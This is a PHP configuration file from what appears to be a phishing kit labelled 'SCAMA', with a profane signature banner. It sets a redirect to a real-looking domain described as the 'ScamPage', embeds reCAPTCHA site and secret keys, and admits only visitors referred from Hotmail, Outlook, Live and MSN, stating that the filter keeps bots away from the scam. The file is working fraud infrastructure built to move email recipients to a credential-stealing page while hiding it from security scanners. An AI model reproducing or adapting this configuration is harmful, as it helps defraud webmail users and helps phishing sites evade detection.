<?php
/*
SH33NZ0 Is Dead 
                      _          _ 
__ ____ __ ____ _ _ _| |_ ___ __| |
\ \ /\ V  V / _` | ' \  _/ -_) _` |
/_\_\ \_/\_/\__,_|_||_\__\___\__,_|
                                   
Now its xWanted Time
*/
// --> #SCAMA Redirect Dont use any ather Redirect =D    ###
$scamaurl = 'https://gtecuae.com/service/'; // Put Here your ScamPage URL Fucking BRO

$captcha_site_key = "6LeHHZ8UAAAAAH3qI8v2Xbg-S9qsQYhVlE6Y1SHf";

$captcha_secret_key = "6LeHHZ8UAAAAAJ8SiLifQ417N76bVRsEajMTrJZS";

$allowed_referers =array("hotmail","outlook","live","msn");
// you can allow vistors only which come fom hotmail or yahoo only 
// to fuck any bot want to access athe scam and you can add more easy 
$show_captchaa = "no";
?>